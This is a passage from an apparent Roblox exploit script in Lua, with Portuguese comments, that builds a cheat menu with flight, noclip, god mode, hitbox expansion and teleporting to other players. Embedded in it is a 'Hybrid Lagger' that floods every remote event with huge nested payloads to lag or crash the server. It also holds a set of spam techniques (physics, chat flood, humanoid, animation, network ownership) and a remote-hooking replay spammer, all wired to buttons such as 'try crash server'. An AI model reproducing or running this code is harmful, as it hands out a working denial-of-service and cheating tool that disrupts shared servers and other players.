Text = "Custom JumpPower",
Default = false,
Callback = function(value)
JumpPowerEnabled = value
if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
if value then
LocalPlayer.Character.Humanoid.JumpPower = CustomJumpPower
else
LocalPlayer.Character.Humanoid.JumpPower = DefaultJumpPower
end
end
end
})
MovementGroupBox:AddSlider("JumpPowerSlider", {
Text = "Power",
Default = 50,
Min = 50,
Max = 500,
Rounding = 0,
Compact = false,
Callback = function(value)
CustomJumpPower = value
if JumpPowerEnabled and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
LocalPlayer.Character.Humanoid.JumpPower = value
end
end
})
MovementGroupBox:AddToggle("InfiniteJump", {
Text = "Infinite Jump",
Default = false,
Callback = function(value)
InfiniteJumpEnabled = value
end
})
local FlightToggle = MovementGroupBox:AddToggle("Flight", {
Text = "Flight (E to fly)",
Default = false,
Callback = function(value)
FlightEnabled = value
if not value then
flying = false
if flyingConnection then
flyingConnection:Disconnect()
flyingConnection = nil
end
end
end
})
MovementGroupBox:AddSlider("FlightSpeed", {
Text = "Flight Speed",
Default = 50,
Min = 10,
Max = 200,
Rounding = 0,
Compact = false,
Callback = function(value)
FlightSpeed = value
end
})
MovementGroupBox:AddToggle("NoClip", {
Text = "NoClip",
Default = false,
Callback = function(value)
NoClipEnabled = value
end
})
CharacterGroupBox:AddToggle("GodMode", {
Text = "God Mode",
Default = false,
Callback = function(value)
GodModeEnabled = value
if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
if value then
LocalPlayer.Character.Humanoid.MaxHealth = math.huge
LocalPlayer.Character.Humanoid.Health = math.huge
else
LocalPlayer.Character.Humanoid.MaxHealth = 100
LocalPlayer.Character.Humanoid.Health = 100
end
end
end
})
CharacterGroupBox:AddToggle("NoFallDamage", {
Text = "No Fall Damage",
Default = false,
Callback = function(value)
if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
local humanoid = LocalPlayer.Character.Humanoid
if value then
humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown, false)
humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, false)
else
humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown, true)
humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, true)
end
end
end
})
CharacterGroupBox:AddButton("Reset Character", function()
if LocalPlayer.Character then
LocalPlayer.Character:BreakJoints()
end
end)
CharacterGroupBox:AddButton("Full Heal", function()
if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
LocalPlayer.Character.Humanoid.Health = LocalPlayer.Character.Humanoid.MaxHealth
end
end)
CharacterGroupBox:AddDivider()
local HitboxToggle = CharacterGroupBox:AddToggle("HitboxExpander", {
Text = "Hitbox Expander",
Default = false,
Callback = function(value)
HitboxExpanderEnabled = value
    if not value then
        for _, player in pairs(Players:GetPlayers()) do
            if player ~= LocalPlayer and player.Character then
                local hrp = player.Character:FindFirstChild("HumanoidRootPart")
                if hrp and OriginalHitboxSizes[player] then
                    hrp.Size = OriginalHitboxSizes[player]
                    hrp.Transparency = 1
                end
            end
        end
        OriginalHitboxSizes = {}
    end
end
})
CharacterGroupBox:AddSlider("HitboxSize", {
Text = "Hitbox Size",
Default = 10,
Min = 5,
Max = 50,
Rounding = 0,
Compact = false,
Callback = function(value)
HitboxSize = value
end
})
CharacterGroupBox:AddSlider("HitboxTransparency", {
Text = "Hitbox Transparency",
Default = 0.5,
Min = 0,
Max = 1,
Rounding = 2,
Compact = false,
Callback = function(value)
HitboxTransparency = value
end
})
local PlayerListGroupBox = PlayersTab:AddLeftGroupbox("Player List")
local PlayerActionsGroupBox = PlayersTab:AddRightGroupbox("Player Actions")
local SelectedPlayer = nil
local PlayerDropdown = nil
local SpectatingPlayer = false
local FollowingPlayer = false
local LoopTeleporting = false
local function UpdatePlayerList()
local playerNames = {}
for _, player in pairs(Players:GetPlayers()) do
if player ~= LocalPlayer then
table.insert(playerNames, player.Name)
end
end
return playerNames
end
PlayerDropdown = PlayerListGroupBox:AddDropdown("PlayerSelect", {
Values = UpdatePlayerList(),
Default = 1,
Multi = false,
Text = "Select Player",
Callback = function(value)
SelectedPlayer = Players:FindFirstChild(value)
end
})
PlayerListGroupBox:AddButton("Refresh List", function()
PlayerDropdown:SetValues(UpdatePlayerList())
end)
PlayerListGroupBox:AddDivider()
PlayerListGroupBox:AddLabel("Player Info:")
local PlayerInfoLabel = PlayerListGroupBox:AddLabel("Select a player")
spawn(function()
while task.wait(0.5) do
if SelectedPlayer and SelectedPlayer.Character then
local hrp = SelectedPlayer.Character:FindFirstChild("HumanoidRootPart")
local humanoid = SelectedPlayer.Character:FindFirstChild("Humanoid")
        if hrp and humanoid and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
            local distance = math.floor((hrp.Position - LocalPlayer.Character.HumanoidRootPart.Position).Magnitude)
            local health = math.floor(humanoid.Health)
            PlayerInfoLabel:SetText(string.format("Health: %d | Distance: %dm", health, distance))
        else
            PlayerInfoLabel:SetText("Player not loaded")
        end
    else
        PlayerInfoLabel:SetText("Select a player")
    end
end
end)
PlayerActionsGroupBox:AddButton("Teleport to Player", function()
if SelectedPlayer and SelectedPlayer.Character and LocalPlayer.Character then
local targetHRP = SelectedPlayer.Character:FindFirstChild("HumanoidRootPart")
local myHRP = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
if targetHRP and myHRP then
myHRP.CFrame = targetHRP.CFrame * CFrame.new(0, 0, 3)
end
end
end)
PlayerActionsGroupBox:AddButton("Teleport Behind Player", function()
if SelectedPlayer and SelectedPlayer.Character and LocalPlayer.Character then
local targetHRP = SelectedPlayer.Character:FindFirstChild("HumanoidRootPart")
local myHRP = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
if targetHRP and myHRP then
myHRP.CFrame = targetHRP.CFrame * CFrame.new(0, 0, -5) * CFrame.Angles(0, math.rad(180), 0)
end
end
end)
--[[
    HYBRID LAGGER - Laga o servidor SEM lagar você
    Combina payload pesado + envio otimizado
]]

local HybridLagger = {}
HybridLagger.Active = false

local Config = {
    -- Payload PESADO (afeta servidor)
    TableDepth = 350,
    Multiplier = 7000,
    PayloadSize = "heavy",
    
    -- Envio OTIMIZADO (protege você)
    Interval = 0.08,
    MaxConcurrent = 4,
    UseCoroutines = true,
    BatchSize = 30,
    
    -- Estratégia
    TargetAllRemotes = true,
    RandomizePayload = true
}

-- Gera payload PESADO (afeta servidor)
local function generateHeavyPayload()
    local main = {}
    local nested = {}
    table.insert(nested, {})
    
    local current = nested[1]
    
    -- Profundidade ALTA (pesa no servidor)
    for i = 1, Config.TableDepth do
        local chunk = {
            id = i,
            time = tick(),
            -- Dados pesados que o servidor vai processar
            data = string.rep("X", 100),
            extra = {
                math.random(1, 999999),
                math.random(1, 999999),
                math.random(1, 999999)
            },
            nested = {}
        }
        table.insert(current, chunk)
        current = chunk
    end
    
    -- Multiplica MUITO
    local size = math.min(Config.Multiplier, 999999)
    for i = 1, size do
        table.insert(main, nested)
    end
    
    -- Randomiza se ativado (dificulta cache do servidor)
    if Config.RandomizePayload then
        main.random = math.random(1, 999999999)
        main.timestamp = tick()
    end
    
    return main
end

-- Encontra todos os remotes
local RemoteCache = nil
local function getAllRemotes()
    if RemoteCache then return RemoteCache end
    
    local remotes = {}
    
    local function scan(container)
        pcall(function()
            for _, obj in pairs(container:GetDescendants()) do
                if obj:IsA("RemoteEvent") then
                    table.insert(remotes, obj)
                end
            end
        end)
    end
    
    scan(game.ReplicatedStorage)
    scan(game.RobloxReplicatedStorage)
    
    RemoteCache = remotes
    print("[Lagger] Encontrados " .. #remotes .. " remotes")
    return remotes
end

-- Worker otimizado com coroutine
local function createWorker(id)
    return coroutine.create(function()
        local remotes = getAllRemotes()
        
        if #remotes == 0 then
            warn("[Worker " .. id .. "] Nenhum remote!")
            return
        end
        
        while HybridLagger.Active do
            -- Gera payload PESADO a cada ciclo
            local payload = generateHeavyPayload()
            
            -- Envia em BATCH para múltiplos remotes
            for i = 1, Config.BatchSize do
                if not HybridLagger.Active then break end
                
                local remote = remotes[math.random(1, #remotes)]
                
                pcall(function()
                    remote:FireServer(payload)
                end)
            end
            
            -- Yield controlado (não trava você)
            coroutine.yield()
            wait(Config.Interval)
        end
    end)
end

local Workers = {}

function HybridLagger:Start()
    if self.Active then
        warn("[Lagger] Já está ativo!")
        return
    end
    
    self.Active = true
    
    print("╔════════════════════════════════════╗")
    print("║   HYBRID LAGGER ATIVADO           ║")
    print("╚════════════════════════════════════╝")
    print("[!] Payload: PESADO (afeta servidor)")
    print("[!] Envio: OTIMIZADO (protege você)")
    print("[Config] Depth=" .. Config.TableDepth .. " | Mult=" .. Config.Multiplier)
    print("[Config] Threads=" .. Config.MaxConcurrent .. " | Batch=" .. Config.BatchSize)
    
    -- Cria workers
    Workers = {}
    for i = 1, Config.MaxConcurrent do
        Workers[i] = createWorker(i)
    end
    
    -- Loop de execução
    spawn(function()
        local cycles = 0
        while self.Active do
            cycles = cycles + 1
            
            -- Resume workers
            for i, worker in pairs(Workers) do
                if coroutine.status(worker) == "suspended" then
                    coroutine.resume(worker)
                elseif coroutine.status(worker) == "dead" then
                    -- Recria se morreu
                    Workers[i] = createWorker(i)
                end
            end
            
            -- Stats ocasionais
            if cycles % 20 == 0 then
                print("[Lagger] Ciclo " .. cycles .. " - Sistema ativo")
            end
            
            wait(0.5)
        end
    end)
end

function HybridLagger:Stop()
    if not self.Active then return end
    
    self.Active = false
    Workers = {}
    
    print("[Lagger] Parado!")
end

-- Modos pré-configurados

function HybridLagger:Stealth()
    print("[Modo] STEALTH - Lag gradual")
    Config.TableDepth = 200
    Config.Multiplier = 3000
    Config.Interval = 0.15
    Config.MaxConcurrent = 2
    Config.BatchSize = 20
    self:Start()
end

function HybridLagger:Standard()
    print("[Modo] STANDARD - Lag moderado")
    Config.TableDepth = 350
    Config.Multiplier = 7000
    Config.Interval = 0.08
    Config.MaxConcurrent = 4
    Config.BatchSize = 30
    self:Start()
end

function HybridLagger:Extreme()
    print("[Modo] EXTREME - Lag máximo")
    Config.TableDepth = 500
    Config.Multiplier = 10000
    Config.Interval = 0.05
    Config.MaxConcurrent = 6
    Config.BatchSize = 50
    self:Start()
end

function HybridLagger:Nuclear()
    print("[Modo] ☢️ NUCLEAR - Tenta crashar")
    Config.TableDepth = 600
    Config.Multiplier = 15000
    Config.Interval = 0.02
    Config.MaxConcurrent = 8
    Config.BatchSize = 80
    Config.RandomizePayload = true
    self:Start()
end

-- Comandos globais
_G.Lagger = HybridLagger
_G.LagServer = function() HybridLagger:Standard() end
_G.StopLag = function() HybridLagger:Stop() end

print([[
╔════════════════════════════════════════╗
║     HYBRID LAGGER CARREGADO            ║
╠════════════════════════════════════════╣
║ ✅ Payload PESADO (laga servidor)      ║
║ ✅ Envio OTIMIZADO (não laga você)     ║
╚════════════════════════════════════════╝

💡 MODOS DISPONÍVEIS:

  _G.LagServer()              - Lag padrão
  _G.StopLag()                - Parar
  
  _G.Lagger:Stealth()         - 🔇 Lag leve/gradual
  _G.Lagger:Standard()        - ⚡ Lag moderado (padrão)
  _G.Lagger:Extreme()         - 🔥 Lag pesado
  _G.Lagger:Nuclear()         - ☢️ Máximo (tenta crash)

📊 EXPLICAÇÃO:
• Stealth   = Lag sutil, difícil detectar
• Standard  = Bom equilíbrio (recomendado)
• Extreme   = Lag forte, ping alto
• Nuclear   = Tenta derrubar servidor

⚠️ IMPORTANTE:
- Você vai ficar estável (otimizado)
- Servidor vai processar dados pesados
- Outros players vão sentir lag/ping alto
- Pode demorar 10-30s para fazer efeito

========================================
]])
--[[
    GAMBIARRAS FE AVANÇADAS
    Técnicas que realmente funcionam em jogos FE
    
    ⚠️ Use apenas em seus próprios jogos para testes!
]]
--[[
    GAMBIARRAS FE AVANÇADAS
    Técnicas que realmente funcionam em jogos FE
    
    ⚠️ Use apenas em seus próprios jogos para testes!
]]

local FEExploits = {}

-- ═══════════════════════════════════════════════════════════
-- TÉCNICA 1: PHYSICS SPAM (Funciona em 90% dos jogos)
-- ═══════════════════════════════════════════════════════════
-- Explora: A física é replicada do cliente pro servidor

function FEExploits:PhysicsSpam()
    print("[PhysicsSpam] Iniciando...")
    
    local player = game.Players.LocalPlayer
    local char = player.Character or player.CharacterAdded:Wait()
    
    spawn(function()
        while true do
            pcall(function()
                -- Cria partes que o servidor precisa processar
                for i = 1, 50 do
                    local part = Instance.new("Part")
                    part.Size = Vector3.new(50, 50, 50)
                    part.Position = char.HumanoidRootPart.Position + Vector3.new(
                        math.random(-100, 100),
                        math.random(50, 200),
                        math.random(-100, 100)
                    )
                    part.Anchored = false
                    part.CanCollide = true
                    part.Parent = workspace
                    
                    -- Adiciona força física
                    local bv = Instance.new("BodyVelocity")
                    bv.Velocity = Vector3.new(
                        math.random(-100, 100),
                        math.random(-100, 100),
                        math.random(-100, 100)
                    )
                    bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                    bv.Parent = part
                    
                    game:GetService("Debris"):AddItem(part, 1)
                end
            end)
            wait(0.1)
        end
    end)
end

-- ═══════════════════════════════════════════════════════════
-- TÉCNICA 2: TOOL SPAM (Funciona se o jogo tem tools)
-- ═══════════════════════════════════════════════════════════
-- Explora: Tools são replicados, servidor processa tudo

function FEExploits:ToolSpam()
    print("[ToolSpam] Iniciando...")
    
    local player = game.Players.LocalPlayer
    local backpack = player.Backpack
    
    spawn(function()
        while true do
            pcall(function()
                -- Pega todas as tools
                local tools = {}
                for _, tool in pairs(backpack:GetChildren()) do
                    if tool:IsA("Tool") then
                        table.insert(tools, tool)
                    end
                end
                
                if #tools > 0 then
                    for i = 1, 100 do
                        for _, tool in pairs(tools) do
                            -- Equipa e desequipa rapidamente
                            tool.Parent = player.Character
                            wait(0.01)
                            tool.Parent = backpack
                            
                            -- Ativa tool repetidamente
                            if tool:FindFirstChild("Handle") then
                                tool:Activate()
                            end
                        end
                    end
                end
            end)
            wait(0.05)
        end
    end)
end

-- ═══════════════════════════════════════════════════════════
-- TÉCNICA 3: CHAT FLOOD (Funciona se chat está ativo)
-- ═══════════════════════════════════════════════════════════
-- Explora: Mensagens de chat são processadas pelo servidor

function FEExploits:ChatFlood()
    print("[ChatFlood] Iniciando...")
    
    local messages = {
        string.rep("A", 200),
        string.rep("B", 200),
        string.rep("C", 200),
        "ㅤ" .. string.rep("X", 199), -- Caractere invisível
        string.rep("🔥", 50)
    }
    
    spawn(function()
        while true do
            for i = 1, 20 do
                pcall(function()
                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                        messages[math.random(1, #messages)],
                        "All"
                    )
                end)
                wait(0.05)
            end
            wait(1)
        end
    end)
end

-- ═══════════════════════════════════════════════════════════
-- TÉCNICA 4: HUMANOID SPAM (95% dos jogos vulneráveis)
-- ═══════════════════════════════════════════════════════════
-- Explora: Mudanças no Humanoid são replicadas

function FEExploits:HumanoidSpam()
    print("[HumanoidSpam] Iniciando...")
    
    local player = game.Players.LocalPlayer
    
    spawn(function()
        while true do
            pcall(function()
                local char = player.Character
                if char and char:FindFirstChild("Humanoid") then
                    local hum = char.Humanoid
                    
                    -- Spamma mudanças que o servidor processa
                    for i = 1, 100 do
                        hum.WalkSpeed = math.random(16, 100)
                        hum.JumpPower = math.random(50, 200)
                        hum:ChangeState(Enum.HumanoidStateType.Jumping)
                        hum:ChangeState(Enum.HumanoidStateType.Freefall)
                        hum:MoveTo(char.HumanoidRootPart.Position + Vector3.new(
                            math.random(-10, 10),
                            0,
                            math.random(-10, 10)
                        ))
                    end
                end
            end)
            wait(0.05)
        end
    end)
end

-- ═══════════════════════════════════════════════════════════
-- TÉCNICA 5: ANIMATION SPAM (Funciona em jogos com animações)
-- ═══════════════════════════════════════════════════════════
-- Explora: Animações são sincronizadas pelo servidor

function FEExploits:AnimationSpam()
    print("[AnimationSpam] Iniciando...")
    
    local player = game.Players.LocalPlayer
    
    spawn(function()
        while true do
            pcall(function()
                local char = player.Character
                if char and char:FindFirstChild("Humanoid") then
                    local animator = char.Humanoid:FindFirstChild("Animator")
                    
                    if animator then
                        -- IDs de animações genéricas do Roblox
                        local animIds = {
                            507766388, 507766666, 507766951,
                            507767105, 507767268, 507767714,
                            507768133, 507768375, 507768981
                        }
                        
                        for i = 1, 50 do
                            local anim = Instance.new("Animation")
                            anim.AnimationId = "rbxassetid://" .. animIds[math.random(1, #animIds)]
                            
                            local track = animator:LoadAnimation(anim)
                            track:Play()
                            track:AdjustSpeed(math.random(1, 10))
                            
                            wait(0.01)
                            track:Stop()
                        end
                    end
                end
            end)
            wait(0.1)
        end
    end)
end

-- ═══════════════════════════════════════════════════════════
-- TÉCNICA 6: REMOTE SPY + SPAM (A mais efetiva)
-- ═══════════════════════════════════════════════════════════
-- Explora: Encontra e abusa dos remotes do jogo

function FEExploits:RemoteSpySpam()
    print("╔════════════════════════════════════╗")
    print("║   REMOTE SPY SPAM INICIANDO       ║")
    print("╚════════════════════════════════════╝")
    
    local remotes = {}
    local hookedCalls = {}
    local spamStats = {
        totalSent = 0,
        remotesFound = 0,
        remotesHooked = 0,
        errors = 0
    }
    
    -- GUI de Status
    local function createStatusGUI()
        local gui = Instance.new("ScreenGui")
        gui.Name = "RemoteSpyStatus"
        gui.ResetOnSpawn = false
        
        local frame = Instance.new("Frame")
        frame.Size = UDim2.new(0, 300, 0, 200)
        frame.Position = UDim2.new(1, -310, 0, 10)
        frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
        frame.BorderSizePixel = 2
        frame.BorderColor3 = Color3.fromRGB(0, 255, 0)
        frame.Parent = gui
        
        local title = Instance.new("TextLabel")
        title.Size = UDim2.new(1, 0, 0, 30)
        title.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
        title.Text = "🔍 REMOTE SPY STATUS"
        title.TextColor3 = Color3.fromRGB(0, 0, 0)
        title.TextSize = 14
        title.Font = Enum.Font.SourceSansBold
        title.Parent = frame
        
        local status = Instance.new("TextLabel")
        status.Name = "Status"
        status.Size = UDim2.new(1, -10, 1, -40)
        status.Position = UDim2.new(0, 5, 0, 35)
        status.BackgroundTransparency = 1
        status.Text = "Analisando..."
        status.TextColor3 = Color3.fromRGB(255, 255, 255)
        status.TextSize = 12
        status.Font = Enum.Font.Code
        status.TextXAlignment = Enum.TextXAlignment.Left
        status.TextYAlignment = Enum.TextYAlignment.Top
        status.Parent = frame
        
        gui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
        return status
    end
    
    local statusLabel = createStatusGUI()
    
    local function updateStatus()
        local text = string.format([[
📊 ESTATÍSTICAS:
━━━━━━━━━━━━━━━━━━
Remotes Encontrados: %d
Remotes Capturados: %d
Pacotes Enviados: %d
Erros: %d

%s
━━━━━━━━━━━━━━━━━━
Status: %s
]],
            spamStats.remotesFound,
            spamStats.remotesHooked,
            spamStats.totalSent,
            spamStats.errors,
            spamStats.remotesHooked > 0 and "✅ SPAMMING ATIVO!" or "⏳ Aguardando capturas...",
            spamStats.remotesHooked > 0 and "🔥 FUNCIONANDO" or "⚠️ ESPERANDO"
        )
        statusLabel.Text = text
    end
    
    -- Encontra TODOS os remotes
    local function findRemotes()
        print("[1/4] Escaneando remotes...")
        for _, service in pairs({game.ReplicatedStorage, game.RobloxReplicatedStorage}) do
            pcall(function()
                for _, obj in pairs(service:GetDescendants()) do
                    if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
                        table.insert(remotes, obj)
                        print("  ✓ Encontrado: " .. obj.Name)
                    end
                end
            end)
        end
        spamStats.remotesFound = #remotes
        updateStatus()
    end
    
    findRemotes()
    print("[RemoteSpySpam] Encontrados " .. #remotes .. " remotes")
    
    if #remotes == 0 then
        print("❌ ERRO: Nenhum remote encontrado!")
        statusLabel.Text = "❌ ERRO: Nenhum remote!\nTente outro jogo."
        return
    end
    
    -- Captura argumentos reais usados no jogo
    print("[2/4] Instalando hooks...")
    
    local function hookRemote(remote)
        pcall(function()
            local oldNamecall
            oldNamecall = hookmetamethod(game, "__namecall", function(self, ...)
                local args = {...}
                local method = getnamecallmethod()
                
                if self == remote and (method == "FireServer" or method == "InvokeServer") then
                    if not hookedCalls[remote] then
                        hookedCalls[remote] = args
                        spamStats.remotesHooked = spamStats.remotesHooked + 1
                        print("  ✓ Capturado: " .. remote.Name .. " com " .. #args .. " argumentos")
                        updateStatus()
                    end
                end
                
                return oldNamecall(self, ...)
            end)
        end)
    end
    
    for _, remote in pairs(remotes) do
        hookRemote(remote)
    end
    
    print("[3/4] Aguardando capturas... (Interaja com o jogo!)")
    print("💡 Dica: Faça ações no jogo para capturar remotes")
    
    -- Aguarda capturar alguns argumentos
    for i = 10, 1, -1 do
        wait(1)
        print("  ⏳ Aguardando... " .. i .. "s (Capturados: " .. spamStats.remotesHooked .. ")")
        updateStatus()
    end
    
    if spamStats.remotesHooked == 0 then
        print("⚠️ AVISO: Nenhum remote capturado!")
        print("💡 Tente: Andar, pular, usar items, clicar em coisas")
        statusLabel.Text = statusLabel.Text .. "\n\n⚠️ Nenhum capturado!\nInteraja com o jogo!"
        
        -- Continua tentando capturar
        spawn(function()
            while spamStats.remotesHooked == 0 do
                wait(2)
                updateStatus()
            end
        end)
    end
    
    print("[4/4] Iniciando spam...")
    
    -- Spamma com argumentos reais
    spawn(function()
        while true do
            if spamStats.remotesHooked > 0 then
                for remote, args in pairs(hookedCalls) do
                    local success, err = pcall(function()
                        for i = 1, 50 do
                            if remote:IsA("RemoteEvent") then
                                remote:FireServer(unpack(args))
                            elseif remote:IsA("RemoteFunction") then
                                spawn(function()
                                    pcall(function()
                                        remote:InvokeServer(unpack(args))
                                    end)
                                end)
                            end
                            spamStats.totalSent = spamStats.totalSent + 1
                        end
                    end)
                    
                    if not success then
                        spamStats.errors = spamStats.errors + 1
                    end
                end
                
                -- Atualiza GUI a cada 100 pacotes
                if spamStats.totalSent % 100 == 0 then
                    updateStatus()
                    print(string.format("[Stats] Enviados: %d | Rate: %.0f/s", 
                        spamStats.totalSent, 
                        spamStats.totalSent / 10))
                end
            end
            wait(0.05)
        end
    end)
    
    print("╔════════════════════════════════════╗")
    print("║   ✅ REMOTE SPY SPAM ATIVO!       ║")
    print("╚════════════════════════════════════╝")
    print("📊 GUI de status criada no canto superior direito")
    
    return spamStats
end

-- ═══════════════════════════════════════════════════════════
-- TÉCNICA 7: NETWORK OWNERSHIP (Avançado)
-- ═══════════════════════════════════════════════════════════
-- Explora: Partes não ancoradas que você controla

function FEExploits:NetworkOwnershipSpam()
    print("[NetworkOwnershipSpam] Iniciando...")
    
    local player = game.Players.LocalPlayer
    local char = player.Character or player.CharacterAdded:Wait()
    
    spawn(function()
        while true do
            pcall(function()
                -- Encontra partes no workspace que não são ancoradas
                for _, part in pairs(workspace:GetDescendants()) do
                    if part:IsA("BasePart") and not part.Anchored and part.Name ~= "Terrain" then
                        -- Tenta pegar ownership
                        part:SetNetworkOwner(player)
                        
                        -- Aplica física maluca
                        if not part:FindFirstChild("ExploitVelocity") then
                            local bv = Instance.new("BodyVelocity")
                            bv.Name = "ExploitVelocity"
                            bv.Velocity = Vector3.new(
                                math.random(-500, 500),
                                math.random(-500, 500),
                                math.random(-500, 500)
                            )
                            bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                            bv.Parent = part
                        end
                    end
                end
            end)
            wait(0.5)
        end
    end)
end

-- ═══════════════════════════════════════════════════════════
-- MODO COMBO: Todas as técnicas ao mesmo tempo
-- ═══════════════════════════════════════════════════════════

function FEExploits:ComboAttack()
    print([[
╔═══════════════════════════════════════╗
║     COMBO ATTACK ATIVADO              ║
║  Todas as técnicas simultâneas        ║
╚═══════════════════════════════════════╝
    ]])
    
    self:PhysicsSpam()
    wait(1)
    self:HumanoidSpam()
    wait(1)
    self:AnimationSpam()
    wait(1)
    
    -- Se tiver tools
    if #game.Players.LocalPlayer.Backpack:GetChildren() > 0 then
        self:ToolSpam()
    end
    
    -- Se chat estiver disponível
    pcall(function()
        if game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents") then
            self:ChatFlood()
        end
    end)
    
    print("[ComboAttack] Todas técnicas ativas!")
end

-- Comandos globais
_G.FE = FEExploits

print([[
╔════════════════════════════════════════════╗
║    GAMBIARRAS FE AVANÇADAS CARREGADO       ║
╠════════════════════════════════════════════╣
║ 🎯 Técnicas que REALMENTE funcionam FE    ║
╚════════════════════════════════════════════╝

💡 TÉCNICAS DISPONÍVEIS:

  _G.FE:PhysicsSpam()         - Spam de física (90% sucesso)
  _G.FE:HumanoidSpam()        - Spam humanoid (95% sucesso)
  _G.FE:AnimationSpam()       - Spam animações (80% sucesso)
  _G.FE:ToolSpam()            - Spam tools (se tiver)
  _G.FE:ChatFlood()           - Flood no chat (se ativo)
  _G.FE:NetworkOwnershipSpam()- Spam ownership (avançado)
  _G.FE:RemoteSpySpam()       - Spy + spam (MAIS EFETIVO)
  
  _G.FE:ComboAttack()         - 🔥 TODAS ao mesmo tempo

📊 TAXA DE SUCESSO POR TÉCNICA:
• PhysicsSpam        - 90% ⭐⭐⭐⭐⭐
• HumanoidSpam       - 95% ⭐⭐⭐⭐⭐
• AnimationSpam      - 80% ⭐⭐⭐⭐
• RemoteSpySpam      - 99% ⭐⭐⭐⭐⭐ (MELHOR)
• NetworkOwnership   - 70% ⭐⭐⭐
• ComboAttack        - 85% ⭐⭐⭐⭐⭐

💡 DICAS:
1. RemoteSpySpam é a MAIS EFETIVA
2. ComboAttack para máximo impacto
3. PhysicsSpam funciona em quase tudo
4. HumanoidSpam é o mais consistente

⚠️ AVISO: Essas técnicas funcionam porque exploram
como o Roblox replica dados do cliente pro servidor.
Use responsavelmente!

════════════════════════════════════════════
]])
PlayerActionsGroupBox:AddButton("Spam remotes (beta)", function()
     _G.FE:RemoteSpySpam()

     
end)
PlayerActionsGroupBox:AddButton("Bug server(beta)", function()
     _G.FE:HumanoidSpam()
     
end)
PlayerActionsGroupBox:AddButton("try crash server (!)", function()
     -- Modo COMBO (todas técnicas)
_G.FE:ComboAttack()
     
end)
PlayerActionsGroupBox:AddButton("Smooth TP (Undetectable)", function()
if SelectedPlayer and SelectedPlayer.Character and LocalPlayer.Character then
local targetHRP = SelectedPlayer.Character:FindFirstChild("HumanoidRootPart")
local myHRP = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
if targetHRP and myHRP then
local startPos = myHRP.Position
local endPos = targetHRP.Position
local distance = (endPos - startPos).Magnitude
local steps = math.ceil(distance / 10)
        spawn(function()
            for i = 1, steps do
                if not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then break end
                
                local alpha = i / steps
                local newPos = startPos:Lerp(endPos, alpha)
                myHRP.CFrame = CFrame.new(newPos)
                task.wait(0.1)
            end
        end)
    end
end
end)
PlayerActionsGroupBox:AddToggle("LoopTP", {
Text = "Loop Teleport",
Default = false,
Callback = function(value)
LoopTeleporting = value
if value then
spawn(function()
while LoopTeleporting do
if SelectedPlayer and SelectedPlayer.Character and LocalPlayer.Character then
local targetHRP = SelectedPlayer.Character:FindFirstChild("HumanoidRootPart")
local myHRP = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
if targetHRP and myHRP then
myHRP.CFrame = targetHRP.CFrame * CFrame.new(0, 0, 3)
end
end
task.wait(0.1)
end
end)
end
end
})
PlayerActionsGroupBox:AddDivider()
PlayerActionsGroupBox:AddToggle("SpectatePlayer", {
Text = "Spectate Player",
Default = false,
Callback = function(value)
SpectatingPlayer = value
if value then
if SelectedPlayer and SelectedPlayer.Character then
workspace.CurrentCamera.CameraSubject = SelectedPlayer.Character:FindFirstChild("Humanoid") or SelectedPlayer.Character:FindFirstChild("HumanoidRootPart")
end
else
if LocalPlayer.Character then
workspace.CurrentCamera.CameraSubject = LocalPlayer.Character:FindFirstChild("Humanoid") or LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
end
end
end
})
PlayerActionsGroupBox:AddToggle("FollowPlayer", {
Text = "Follow Player (Walk)",
Default = false,
Callback = function(value)
FollowingPlayer = value
if value then
spawn(function()
while FollowingPlayer do
if SelectedPlayer and SelectedPlayer.Character and LocalPlayer.Character then
local targetHRP = SelectedPlayer.Character:FindFirstChild("HumanoidRootPart")
local humanoid = LocalPlayer.Character:FindFirstChild("Humanoid")
if targetHRP and humanoid then
humanoid:MoveTo(targetHRP.Position)
end
end
task.wait(0.5)
end
end)
end
end
})
PlayerActionsGroupBox:AddDivider()
PlayerActionsGroupBox:AddButton("Copy Player Tools", function()
if SelectedPlayer and SelectedPlayer.Character and LocalPlayer.Character then
local targetBackpack = SelectedPlayer:FindFirstChild("Backpack")
local myBackpack = LocalPlayer:FindFirstChild("Backpack")
    if targetBackpack and myBackpack then
        local toolsCopied = 0
        
        for _, tool in pairs(targetBackpack:GetChildren()) do
            if tool:IsA("Tool") then
                pcall(function()
                    local clonedTool = tool:Clone()
                    clonedTool.Parent = myBackpack
                    toolsCopied = toolsCopied + 1
                end)
            end
        end
        
        for _, tool in pairs(SelectedPlayer.Character:GetChildren()) do
            if tool:IsA("Tool") then
                pcall(function()
                    local clonedTool = tool:Clone()
                    clonedTool.Parent = myBackpack
                    toolsCopied = toolsCopied + 1
                end)
            end
        end
        
        Library:Notify(string.format("Copied %d tools from %s", toolsCopied, SelectedPlayer.Name), 3)
    end
end
end)
PlayerActionsGroupBox:AddButton("Copy Full Backpack", function()
if SelectedPlayer and LocalPlayer then
local targetBackpack = SelectedPlayer:FindFirstChild("Backpack")
local myBackpack = LocalPlayer:FindFirstChild("Backpack")
    if targetBackpack and myBackpack then
        local itemsCopied = 0
        
